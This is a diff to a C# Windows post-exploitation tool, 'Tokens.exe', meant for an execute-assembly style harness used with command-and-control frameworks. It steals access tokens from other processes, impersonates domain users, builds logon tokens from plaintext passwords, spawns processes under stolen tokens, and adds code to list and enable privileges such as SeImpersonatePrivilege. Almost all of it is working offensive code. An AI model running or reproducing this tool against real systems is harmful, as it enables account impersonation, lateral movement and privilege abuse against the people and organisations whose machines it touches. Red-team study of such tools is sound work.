@@ -5,6 +5,11 @@ using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Diagnostics;
 using System.Management; // You must add the reference to System.Management
+using System.Text;
+using System.Diagnostics.CodeAnalysis;
+
+using DWORD = System.UInt32;
+using LARGE_INTEGER = System.UInt64;
 
 // Note: this code is meant to be run via some sort of execute-assembly style CLR harness that does *not*
 // perform a fork-n-run: (e.g.: Powershell Empire's Invoke-Assembly, Badrat's C# rat csharp command).
@@ -14,6 +19,7 @@ using System.Management; // You must add the reference to System.Management
 
 // Written based on code from https://xret2pwn.github.io/Access-Token-Part0x01/
 // and https://xret2pwn.github.io/Building-Token-Vault-Part0x02/
+// and https://github.com/0xbadjuju/Tokenvator/blob/master/Tokenvator/Plugins/Execution/CreateProcess.cs#L75-L150
 // Thanks to pinvoke.net for the Pinvoke structures and functions
 public class Program
 {
@@ -155,6 +161,45 @@ public class Program
         TokenImpersonation
     }
 
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TOKEN_PRIVILEGES_ARRAY
+    {
+        public UInt32 PrivilegeCount;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 30)]
+        public LUID_AND_ATTRIBUTES[] Privileges;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID_AND_ATTRIBUTES
+    {
+        public LUID Luid;
+        public DWORD Attributes;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID
+    {
+        public DWORD LowPart;
+        public DWORD HighPart;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PRIVILEGE_SET
+    {
+        public DWORD PrivilegeCount;
+        public DWORD Control;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = (Int32)ANYSIZE_ARRAY)]
+        public LUID_AND_ATTRIBUTES[] Privilege;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct TOKEN_PRIVILEGES
+    {
+        public uint PrivilegeCount;
+        public LUID Luid;
+        public uint Attributes;
+    }
+
     public enum LogonProvider
     {
         LOGON32_LOGON_INTERACTIVE = 2,
@@ -174,7 +219,7 @@ public class Program
         LOGON32_PROVIDER_WINNT50 = 3
     }
 
-    enum TOKEN_INFORMATION_CLASS
+    public enum TOKEN_INFORMATION_CLASS
     {
         TokenUser = 1,
         TokenGroups,
@@ -193,6 +238,21 @@ public class Program
         TokenSandBoxInert,
         TokenAuditPolicy,
         TokenOrigin
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct TOKEN_STATISTICS
+    {
+        public LUID TokenId;
+        public LUID AuthenticationId;
+        public LARGE_INTEGER ExpirationTime;
+        public TOKEN_TYPE TokenType;
+        public SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
+        public DWORD DynamicCharged;
+        public DWORD DynamicAvailable;
+        public DWORD GroupCount;
+        public DWORD PrivilegeCount;
+        public LUID ModifiedId;
     }
 
     enum SID_NAME_USE
@@ -217,6 +277,12 @@ public class Program
     }
 
     public const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;
+
+    public const Int32 ANYSIZE_ARRAY = 1;
+    public const Int32 PRIVILEGE_SET_ALL_NECESSARY = 1;
+
+    const uint SE_PRIVILEGE_ENABLED = 0x00000002;
+    const uint SE_PRIVILEGE_NONE = 0x00000000;
 
     // pinvoke functions section
     [DllImport("kernel32.dll", SetLastError = true)]
@@ -263,15 +329,52 @@ public class Program
         System.Text.StringBuilder lpName, ref uint cchName, System.Text.StringBuilder ReferencedDomainName,
         ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
 
+    [DllImport("kernel32.dll",
+           SetLastError = true,
+           CharSet = CharSet.Auto)]
+    public static extern uint SearchPath(string lpPath,
+                    string lpFileName,
+                    string lpExtension,
+                    int nBufferLength,
+                    [MarshalAs ( UnmanagedType.LPTStr )]
+                    StringBuilder lpBuffer,
+                    out IntPtr lpFilePart);
+
     [DllImport("advapi32.dll", SetLastError = true)]
     public static extern bool RevertToSelf();
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool LookupPrivilegeValue(string systemName, string privilegeName, ref LUID luid);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool LookupPrivilegeName(
+        string lpSystemName,
+        IntPtr lpLuid,
+        StringBuilder lpName,
+        ref Int32 cchName
+    );
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern Boolean GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    internal static extern Boolean GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, ref TOKEN_STATISTICS TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern Boolean PrivilegeCheck(IntPtr ClientToken, PRIVILEGE_SET RequiredPrivileges, IntPtr pfResult);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern Boolean PrivilegeCheck(IntPtr ClientToken, ref PRIVILEGE_SET RequiredPrivileges, out Int32 pfResult);
 
     public struct TokenEntry
     {
         public IntPtr hToken;
         public WindowsIdentity winId;
         public int pid;
-
     }
 
     public static List<TokenEntry> TokenList;
@@ -339,9 +442,10 @@ public class Program
         Console.WriteLine("Switched to token #" + index);
         return true;
     }
-    private static bool MakeToken(string domain, string username, string password)
+    private static bool MakeToken(string domain, string username, string password, LogonProvider logonType = LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS)
     {
-        if (!LogonUser(username, domain, password, LogonProvider.LOGON32_LOGON_INTERACTIVE,
+        // Defaults to using logon type 9 (LOGON32_LOGON_NEW_CREDENTIALS)
+        if (!LogonUser(username, domain, password, logonType,
             LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out var hToken))
         {
             Console.WriteLine("Error: Couldn't LogonUser with username:password \""
@@ -361,7 +465,7 @@ public class Program
         var identity = new WindowsIdentity(CurrentToken);
         WindowsImpersonationContext impersonatedUser = identity.Impersonate();
         AddToken(hToken, 0); // Add the token we made to the Token List...
-        Console.WriteLine("Successfully made token with username:password \"" + domain + "\\" + username + ":" + password + "\"");
+        Console.WriteLine("Successfully made token (" + logonType + " [" + (int)logonType + "]) with username:password \"" + domain + "\\" + username + ":" + password + "\"");
         return true;
     }
     private static bool StealToken(int pid)
@@ -428,12 +532,22 @@ public class Program
         // Get a list of all processes
         Process[] processes = Process.GetProcesses();
 
+        ManagementObjectCollection objectCollection;
+
         // Set up WMI connection. We're going to use this to get the owner of every process
-        ManagementScope scope = new ManagementScope(@"\\.\root\cimv2");
-        scope.Connect();
-        ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
-        ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
-        ManagementObjectCollection objectCollection = objectSearcher.Get();
+        try
+        {
+            ManagementScope scope = new ManagementScope(@"\\.\root\cimv2");
+            scope.Connect();
+            ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
+            ManagementObjectSearcher objectSearcher = new ManagementObjectSearcher(scope, query);
+            objectCollection = objectSearcher.Get();
+        }
+        catch (Exception e)
+        {
+            Console.WriteLine($"[-] Error: Could not connect to WMI to get process information: {e}");
+            return pids;
+        }
 
         // This takes a long time...
         foreach (ManagementObject managementObject in objectCollection)
@@ -491,7 +605,7 @@ public class Program
         {
             foreach (KeyValuePair<Int32, String> keyValuePair in owners)
             {
-                if(keyValuePair.Value != null && keyValuePair.Value == username)
+                if (keyValuePair.Value != null && keyValuePair.Value == username)
                 {
                     pids.Add(keyValuePair.Key);
                 }
@@ -501,15 +615,16 @@ public class Program
     }
     private static bool ImpersonateUser(string username)
     {
+        username = username.Replace('/', '\\'); // Alias to allow forward slashes between DOMAIN and user
         List<Int32> pids = SampleProcesses(username);
-        if(pids.Count == 0)
+        if (pids.Count == 0)
         {
-            Console.WriteLine($"[!] No processes found for user {username}. Make sure to include the domain in the user as DOMIN\\username format");
+            Console.WriteLine($"[!] No processes found for user {username}. Make sure to include the domain in the user as DOMIN\\username or DOMAIN/username format");
             return false;
         }
         foreach (Int32 pid in pids)
         {
-            if(StealToken(pid))
+            if (StealToken(pid))
             {
                 return true;
             }
@@ -542,27 +657,183 @@ public class Program
         }
         return result;
     }
-    private static bool CreateProcessWithToken(string command, bool shell = false, bool output = false)
+    ////////////////////////////////////////////////////////////////////////////////
+    // Wrapper for CreateProcessWithTokenW // thx Tokenvator
+    ////////////////////////////////////////////////////////////////////////////////
+    public static bool CreateProcessWithToken(IntPtr phNewToken, string name, string arguments)
     {
-        string processPath = null; // The lpApplicationName parameter can be NULL. In that case, the module name must be the first white space–delimited token in the lpCommandLine string.
-        string commandLine = null; // The lpCommandLine parameter can be NULL. In that case, the function uses the string pointed to by lpApplicationName as the command line.
-        if (shell)
+        if (!name.ToLower().EndsWith(".exe"))
         {
-            processPath = "cmd.exe";
-            commandLine = "/c " + command;
+            name = name + ".exe"; // Creature comfort. Add the exe file extension if it's not already there
+        }
+        if (name.Contains(@"\"))
+        {
+            name = System.IO.Path.GetFullPath(name);
+            if (!System.IO.File.Exists(name))
+            {
+                Console.WriteLine("[-] Executable file not found!");
+                return false;
+            }
         }
         else
         {
-            commandLine = command;
+            name = FindFilePath(name);
+            if (string.Empty == name)
+            {
+                Console.WriteLine("[-] Unable to find the specified executable file!");
+                return false;
+            }
         }
-
-        var si = new STARTUPINFO();
-        var pi = new PROCESS_INFORMATION();
-        if(!CreateProcessWithTokenW(CurrentToken, 0, processPath, commandLine, (CreationFlags)IntPtr.Zero, IntPtr.Zero, null, ref si, out pi))
+        STARTUPINFO startupInfo = new STARTUPINFO
         {
-            Console.WriteLine("Could not CreateProcessWithTokenW! Error: " + Marshal.GetLastWin32Error());
+            cb = Marshal.SizeOf(typeof(STARTUPINFO))
+        };
+        PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
+        if (!CreateProcessWithTokenW(
+            phNewToken,
+            LogonFlags.NetCredentialsOnly,
+            name,
+            name + " " + arguments,
+            CreationFlags.DefaultErrorMode,
+            IntPtr.Zero,
+            Environment.CurrentDirectory,
+            ref startupInfo,
+            out processInformation
+        ))
+        {
+            Console.WriteLine($"[-] Function CreateProcessWithTokenW failed: Error code: {Marshal.GetLastWin32Error()}");
             return false;
         }
+        Console.WriteLine("[+] Created process successfully! PID: {0}", processInformation.dwProcessId);
+        return true;
+    }
+    public static string FindFilePath(string name)
+    {
+        StringBuilder lpFileName = new StringBuilder(260);
+        IntPtr lpFilePart = new IntPtr();
+        uint result = SearchPath(null, name, null, lpFileName.Capacity, lpFileName, out lpFilePart);
+        if (string.Empty == lpFileName.ToString())
+        {
+            Console.WriteLine(new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error()).Message);
+            return string.Empty;
+        }
+        return lpFileName.ToString();
+    }
+    public static bool ListPrivs()
+    {
+        ////////////////////////////////////////////////////////////////////////////////
+        // Prints the tokens privileges // Taken from NetSPI's Tokenvator project
+        ////////////////////////////////////////////////////////////////////////////////
+        int TokenInfLength = 0;
+        GetTokenInformation(CurrentToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, IntPtr.Zero, 0, ref TokenInfLength);
+
+        if (TokenInfLength < 0 || TokenInfLength > Int32.MaxValue)
+        {
+            Console.WriteLine($"[-] Function GetTokenInformation failed: Error code: {Marshal.GetLastWin32Error()}");
+            return false;
+        }
+        IntPtr lpTokenInformation = Marshal.AllocHGlobal((Int32)TokenInfLength);
+
+
+        if (!GetTokenInformation(CurrentToken, TOKEN_INFORMATION_CLASS.TokenPrivileges, lpTokenInformation, (uint)TokenInfLength, ref TokenInfLength))
+        {
+            Console.WriteLine($"[-] Function GetTokenInformation failed: Error code: {Marshal.GetLastWin32Error()}");
+            return false;
+        }
+        TOKEN_PRIVILEGES_ARRAY tokenPrivileges = (TOKEN_PRIVILEGES_ARRAY)Marshal.PtrToStructure(lpTokenInformation, typeof(TOKEN_PRIVILEGES_ARRAY));
+        Marshal.FreeHGlobal(lpTokenInformation);
+        Console.WriteLine("[*] Enumerated {0} Privileges", tokenPrivileges.PrivilegeCount);
+        Console.WriteLine();
+        Console.WriteLine("{0,-45}{1,-30}", "Privilege Name", "Enabled");
+        Console.WriteLine("{0,-45}{1,-30}", "==============", "=======");
+
+        for (Int32 i = 0; i < tokenPrivileges.PrivilegeCount; i++)
+        {
+            StringBuilder lpName = new StringBuilder();
+            Int32 cchName = 0;
+            IntPtr lpLuid = Marshal.AllocHGlobal(Marshal.SizeOf(tokenPrivileges.Privileges[i]));
+            Marshal.StructureToPtr(tokenPrivileges.Privileges[i].Luid, lpLuid, true);
+
+            LookupPrivilegeName(null, lpLuid, null, ref cchName);
+            if (cchName <= 0 || cchName > Int32.MaxValue)
+            {
+                Console.WriteLine($"[-] Function LookupPrivilegeName failed: Error code: {Marshal.GetLastWin32Error()}");
+                Marshal.FreeHGlobal(lpLuid);
+                continue;
+            }
+
+            lpName.EnsureCapacity(cchName + 1);
+            if (!LookupPrivilegeName(null, lpLuid, lpName, ref cchName))
+            {
+                Console.WriteLine($"[-] Function LookupPrivilegeName (2) failed: Error code: {Marshal.GetLastWin32Error()}");
+                Marshal.FreeHGlobal(lpLuid);
+                continue;
+            }
+
+            PRIVILEGE_SET privilegeSet = new PRIVILEGE_SET
+            {
+                PrivilegeCount = 1,
+                Control = PRIVILEGE_SET_ALL_NECESSARY,
+                Privilege = new LUID_AND_ATTRIBUTES[] { tokenPrivileges.Privileges[i] }
+            };
+
+            Int32 pfResult = 0;
+            if (!PrivilegeCheck(CurrentToken, ref privilegeSet, out pfResult))
+            {
+                Console.WriteLine($"[-] Function PrivilegeCheck failed: Error code: {Marshal.GetLastWin32Error()}");
+                Marshal.FreeHGlobal(lpLuid);
+                continue;
+            }
+            Console.WriteLine("{0,-45}{1,-30}", lpName.ToString(), Convert.ToBoolean(pfResult));
+            Marshal.FreeHGlobal(lpLuid);
+        }
+        Console.WriteLine();
+        return true;
+    }
+    public static bool EnablePriv(string priv)
+    {
+        LUID luid = new LUID();
+        if (!LookupPrivilegeValue(null, priv, ref luid))
+        {
+            Console.WriteLine($"[-] Function LookupPrivilegeValue failed: Error code: {Marshal.GetLastWin32Error()}");
+            return false;
+        }
+
+        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
+        {
+            PrivilegeCount = 1,
+            Luid = luid,
+            Attributes = SE_PRIVILEGE_ENABLED
+        };
+
+        if (!AdjustTokenPrivileges(CurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
+        {
+            Console.WriteLine($"[-] Function AdjustTokenPrivileges failed: Error code: {Marshal.GetLastWin32Error()}");
+        }
+        Console.WriteLine($"[+] Successfully enabled privilege: {priv}");
+        return true;
+    }
+    public static bool DisablePriv(string priv)
+    {
+        LUID luid = new LUID();
+        if (!LookupPrivilegeValue(null, priv, ref luid))
+        {
+            Console.WriteLine($"[-] Function LookupPrivilegeValue failed: Error code: {Marshal.GetLastWin32Error()}");
+            return false;
+        }
+
+        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
+        {
+            PrivilegeCount = 1,
+            Luid = luid,
+            Attributes = SE_PRIVILEGE_NONE
+        };
+
+        if (!AdjustTokenPrivileges(CurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
+        {
+            Console.WriteLine($"[-] Function AdjustTokenPrivileges failed: Error code: {Marshal.GetLastWin32Error()}");
+        }
+        Console.WriteLine($"[+] Successfully disabled privilege: {priv}");
         return true;
     }
     private static bool Rev2Self()
@@ -577,22 +848,29 @@ public class Program
     {
         Console.WriteLine("Usage:     Tokens.exe <function> [args]\n");
         Console.WriteLine("Usage:     Tokens.exe steal_token <pid>");
-        Console.WriteLine("Usage:     Tokens.exe make_token <domain> <username> <password>");
+        Console.WriteLine("Usage:     Tokens.exe make_token <domain> <username> <password> [logonType]");
         Console.WriteLine("Usage:     Tokens.exe list_tokens");
         Console.WriteLine("Usage:     Tokens.exe sample_processes");
         Console.WriteLine("Usage:     Tokens.exe impersonate_user <domain\\username>");
-        Console.WriteLine("Usage:     Tokens.exe create_process [--shell] <command> [command arguments ...]");
+        Console.WriteLine("Usage:     Tokens.exe create_process <command> [command arguments ...]");
         Console.WriteLine("Usage:     Tokens.exe use_token <token_id>");
         Console.WriteLine("Usage:     Tokens.exe whoami");
+        Console.WriteLine("Usage:     Tokens.exe list_privs");
+        Console.WriteLine("Usage:     Tokens.exe enable_priv <privilege>");
+        Console.WriteLine("Usage:     Tokens.exe disable_priv <privilege>");
+        Console.WriteLine("Usage:     Tokens.exe list_privs");
         Console.WriteLine("Usage:     Tokens.exe rev2self\n");
         Console.WriteLine("Example:   Tokens.exe steal_token 4468");
-        Console.WriteLine("Example:   Tokens.exe make_token borgar kclark Summer2019!");
+        Console.WriteLine("Example:   Tokens.exe make_token borgar kclark Summer2019! LOGON32_LOGON_INTERACTIVE");
         Console.WriteLine("Example:   Tokens.exe list_tokens");
         Console.WriteLine("Example:   Tokens.exe sample_processes");
         Console.WriteLine("Example:   Tokens.exe impersonate_user BORGAR\\kclark");
-        Console.WriteLine("Usage:     Tokens.exe create_process --shell whoami /all");
+        Console.WriteLine("Example:   Tokens.exe create_process whoami /all");
         Console.WriteLine("Example:   Tokens.exe use_token 3");
         Console.WriteLine("Example:   Tokens.exe whoami");
+        Console.WriteLine("Example:   Tokens.exe list_privs");
+        Console.WriteLine("Example:   Tokens.exe enable_priv SeImpersonatePrivilege");
+        Console.WriteLine("Example:   Tokens.exe disable_priv SeBackupPrivilege");
         Console.WriteLine("Example:   Tokens.exe rev2self\n");
     }
     public static void Main(string[] args)
@@ -615,26 +893,50 @@ public class Program
             }
             else
             {
-                Console.WriteLine("Could not parse PID (" + args[1] + ") as an integer");
+                Console.WriteLine("[-] Could not parse PID (" + args[1] + ") as an integer");
             }
         }
-        else if (args[0] == "make_token" && args.Length == 4)
+        else if (args[0] == "make_token" && (args.Length == 4 || args.Length == 5))
         {
             string domain = args[1];
             string username = args[2];
             string password = args[3];
-            if (MakeToken(domain, username, password))
+            if (args.Length == 5)
             {
-                Console.WriteLine("Current user after token creation: " + GetCurrentTokenUser());
+                try
+                {
+                    LogonProvider logonType = (LogonProvider)Enum.Parse(typeof(LogonProvider), args[4]);
+                    MakeToken(domain, username, password, logonType);
+                }
+                catch
+                {
+                    Console.WriteLine("[-] Could not parse logonType (" + args[4] + ") as an valid logon type");
+                }
+            }
+            else
+            {
+                MakeToken(domain, username, password);
             }
         }
         else if (args[0] == "list_tokens")
         {
             ListTokens();
         }
+        else if (args[0] == "list_privs")
+        {
+            ListPrivs();
+        }
+        else if (args[0] == "enable_priv" && args.Length == 2)
+        {
+            EnablePriv(args[1]);
+        }
+        else if (args[0] == "disable_priv" && args.Length == 2)
+        {
+            DisablePriv(args[1]);
+        }
         else if (args[0] == "impersonate_user")
         {
-            if(args.Length > 1)
+            if (args.Length > 1)
             {
                 string username = args[1];
                 ImpersonateUser(username);
@@ -650,26 +952,22 @@ public class Program
         }
         else if (args[0] == "create_process")
         {
+            string commandLine = "";
             if (args.Length > 1)
             {
-                bool shell = false;
-                string commandLine = null;
-                int argsToSkip = 1; // Skip just one arg for "create_process", assume no --shell.
-                if (args[1] == "--shell")
+                string program = args[1];
+                if (args.Length > 2)
                 {
-                    shell = true;
-                    argsToSkip = 2;
-                    commandLine = parseArgs(args.Skip(2).Take(args.Length).ToArray()); // args[1:] and parse them into a string
+                    commandLine = parseArgs(args.Skip(2).Take(args.Length).ToArray());
                 }
-                commandLine = parseArgs(args.Skip(argsToSkip).Take(args.Length).ToArray());
-                CreateProcessWithToken(commandLine, shell);
+                CreateProcessWithToken(CurrentToken, program, commandLine);
             }
             else
             {
                 usage();
             }
         }
-        else if (args[0] == "use_token")
+        else if (args[0] == "use_token" && args.Length == 2)
         {
             if (int.TryParse(args[1], out int index))
             {
